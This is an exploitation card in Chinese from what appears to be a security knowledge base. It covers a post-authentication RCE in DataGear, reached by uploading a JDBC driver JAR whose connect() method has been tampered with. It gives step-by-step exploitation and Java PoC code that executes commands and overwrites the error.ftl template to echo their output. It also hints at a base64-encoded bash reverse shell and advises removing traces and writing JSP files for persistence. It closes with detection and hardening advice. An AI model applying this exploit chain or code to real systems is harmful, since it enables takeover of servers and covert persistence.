---
id: web-java-component-datagear-jdbc-driver-upload-connect-rce
title: DataGear 后台 JDBC 驱动上传替换：篡改 Driver.connect 执行命令，覆盖 error.ftl 回显
type: scenario
domain: web
path: web/java/component
technique: datagear-jdbc-driver-replace-rce
tags:
- java
- datagear
- jdbc
- driver
- jar-upload
- rce
- freemarker
- error-template
- post-auth
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V224
  verified_at: '2026-11-07T06:44:11+08:00'
  notes: 已对照 content.md 与 15/15 张图核对：admin 后台数据源驱动管理上传恶意 mysql-connector-java-8.0.28.jar、修改 NonRegisteringDriver.connect 执行 calc、数据源选择驱动后点击数据库弹计算器、反弹 shell 与 nc 监听、覆盖 error.ftl 后访问 /aaaa 回显 whoami 均与原文一致；不出网失败变体（自定义 ClassLoader 报错、DriverManager 递归）也按原文写入边界。已删除原文未支持的 admin/admin 默认口令表述；原文仅以 DataGear 4.5.0 为测试环境、未给受影响区间，已 clear affected_versions。与 classloader-jdbc-driver-spi-credential-theft、DataEase JSON driver override、DataGear SpEL 行表达式卡 dedup 均为 related，入口/sink 不同，保留。未验证点：PoC 未本机复跑。
url: /docs/web/java/component/web-java-component-datagear-jdbc-driver-upload-connect-rce/
draft: false
kb_aliases:
- DataGear JDBC 驱动 RCE
- DataGear 数据源驱动上传
- 替换 JDBC Driver connect
- error.ftl 覆盖回显
- DataGear 后台 RCE
---

## 一句话结论

DataGear 管理后台的“数据源驱动管理”允许上传任意 JDBC 驱动 JAR 并指定驱动类；把 MySQL Connector/J 的 `com.mysql.cj.jdbc.NonRegisteringDriver.connect()` 改成执行 `Runtime.getRuntime().exec()` 后重新打包上传，再创建/测试使用该驱动的数据源，DataGear 在连接数据库时会实例化驱动并调用 `connect()`，从而以 DataGear 进程权限执行命令；不出网时可把命令输出写入 FreeMarker 的 `error.ftl` 模板，再访问不存在的页面触发模板渲染回显。

## 原理

- DataGear 是 Java 数据可视化平台，后台“数据源驱动管理”用于上传数据库驱动 JAR（内置 MySQL、Oracle、PostgreSQL、SQL Server 等），并登记驱动类名，供数据源选择使用。
- JDBC 规范中 `java.sql.Driver.connect(String url, Properties info)` 由驱动实现，`DriverManager.getConnection()` 或连接池在建立连接时会调用它。DataGear 使用用户上传的驱动 JAR 时，会通过类加载器加载指定驱动类并在测试/连接数据源时调用 `connect()`。
- 上传的 JAR 没有签名/完整性校验，驱动类名也由用户填写；攻击者可以下载一个合法驱动（如 `mysql-connector-java-8.0.28.jar`），修改其中 `com.mysql.cj.jdbc.NonRegisteringDriver.connect()` 的字节码，在方法开头插入命令执行，再重新打包成同名/自定义驱动上传。
- 数据源 URL 可以是任意 `jdbc:mysql://...`（不要求数据库真实可达），因为恶意代码在驱动内部、真正发起网络连接之前就执行；点击“测试”或打开数据源即可触发。
- 不出网回显：驱动代码运行在 DataGear 的 JVM 内，拥有进程文件权限。DataGear 使用 FreeMarker 模板渲染页面，未匹配路由会进入 `error.ftl`；把命令输出写入模板文件（原文在 IDEA 源码运行环境写 `datagear-web/src/main/resources/org/datagear/web/templates/error.ftl`），再请求任意不存在路径，错误页就会渲染命令输出。该方式不依赖反向连接，也不需要数据库可写。
- 失败变体说明：在 `connect()` 里自定义 `ClassLoader` 受限（只能改一个方法、无法新增类）；在 `connect()` 内调用 `DriverManager.getConnection()` 会再次进入自身 `connect()` 造成递归/无限弹窗，且数据库插入未成功。因此模板覆盖是更稳定的无外网回显路径。

## 触发条件

- 攻击者拥有 DataGear 管理员账号（原文以已登录 admin 为前提，未说明凭据获取方式）。
- 目标版本提供“数据源驱动管理/驱动上传”功能（原文测试 DataGear 4.5.0）。
- 攻击者能上传 JAR 并创建/编辑数据源；驱动类名可填写为被篡改的类。
- DataGear 进程对模板目录有写权限（源码运行/可写部署）；打包部署时模板可能位于 `WEB-INF/classes` 或 JAR 内，需要换其他可写路径外带。
- 目标允许执行系统命令（Java `Runtime.exec` 未被 SecurityManager/容器策略限制）。

## 利用步骤

1. 以管理员登录 DataGear，进入“数据源驱动管理”，确认可上传驱动。
2. 下载合法 JDBC 驱动（如 `mysql-connector-java-8.0.28.jar`），用反编译/字节码工具修改 `com.mysql.cj.jdbc.NonRegisteringDriver.connect(String url, Properties info)`：在方法开头插入命令执行，返回 `null` 或原逻辑。
3. 重新打包 JAR，在 DataGear 中新增驱动：填写名称，上传恶意 JAR，驱动类名填 `com.mysql.cj.jdbc.Driver`（或 `com.mysql.cj.jdbc.NonRegisteringDriver`）。
4. 新建/编辑数据源，URL 填 `jdbc:mysql://127.0.0.1:3306/any`，选择刚上传的驱动，保存后点击“测试”或打开数据库连接。
5. 驱动被加载并调用 `connect()`，命令执行；出网时用 bash 反弹 shell，不出网时执行 `whoami` 等并把输出写入可访问的模板文件。
6. 访问不存在路径（如 `/aaaa`）触发 `error.ftl` 渲染，读取命令输出；也可写入其他可执行/可读文件作为回显或持久化。
7. 清理上传的恶意驱动与数据源，避免留下明显痕迹（视授权范围）。

## PoC

篡改后的 `connect()`：

```java
public Connection connect(String url, Properties info) throws SQLException {
    try {
        Runtime.getRuntime().exec("calc"); // 或 bash -c {echo,<base64>}|{base64,-d}|{bash,-i}
    } catch (Exception e) {
        throw SQLExceptionsMapping.translateException(e);
    }
    return null;
}
```

不出网写模板回显：

```java
public Connection connect(String url, Properties info) throws SQLException {
    try {
        Process p = Runtime.getRuntime().exec("whoami");
        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = r.readLine()) != null) sb.append(line).append("\n");
        p.waitFor();
        Files.write(Paths.get("/path/to/datagear-web/src/main/resources/org/datagear/web/templates/error.ftl"),
            sb.toString().getBytes(), StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING);
    } catch (Exception e) {
        throw SQLExceptionsMapping.translateException(e);
    }
    return null;
}
```

## 变体与关联

- 变体：替换 PostgreSQL/Oracle/SQL Server 等任意驱动的 `connect()` 实现，或改 `acceptsURL()`/静态初始化块，触发点更早。
- 变体：不出网时将输出写入可被 Web 访问的静态文件、日志、模板或 JSP 目录（取决于部署权限），也可写内存马配置。
- 变体：若 DataGear 以高权限运行且模板目录可写，可直接写 JSP/脚本实现持久化；若模板在 JAR 内，可改用日志/上传目录等可写路径。
- 关联：[[web-java-expression-spel-datagear-row-expression-rce]]（DataGear 另一条表达式注入 RCE）、[[web-java-component-dataease-json-driver-override-jdbc-rce]]（同类 JDBC 驱动/URL 滥用的其他产品）、[[web-java-component-h2-jdbc-url-filter-bypass-runscript]]（JDBC URL 触发脚本执行）。
- 边界：需要管理员权限；驱动 JAR 修改需要能重打包并保持类结构；`connect()` 内递归调用 `DriverManager.getConnection()` 会重复触发；模板路径随部署方式变化，打包部署时可能不可写。

## 检测与防御

- 检测：数据源驱动管理出现新上传的 JAR、与内置驱动同名但 hash 不同、驱动类名指向非官方实现；数据源创建/测试后 Java 进程派生 `cmd.exe`/`bash`/`calc` 等子进程；`error.ftl` 或其他模板文件被非发布流程修改。
- 检测：驱动 JAR 的 `connect`/`acceptsURL` 等类被反编译发现 `Runtime.exec`/`ProcessBuilder`/反射类加载；上传目录出现可执行 JAR；异常的数据源 URL 与频繁连接测试。
- 防御：仅允许管理员从可信来源安装驱动，并对驱动 JAR 做签名/哈希白名单校验；限制“数据源驱动管理”权限；DataGear 以最小权限用户运行；模板目录只读；启用 Java SecurityManager/容器策略限制 `Runtime.exec` 与文件写入；监控子进程与模板完整性。
- 加固：生产环境禁用不必要的驱动上传功能；对上传 JAR 做静态扫描（危险方法、类名、字节码特征）；将模板与配置放入只读镜像；定期审计数据源与驱动列表。
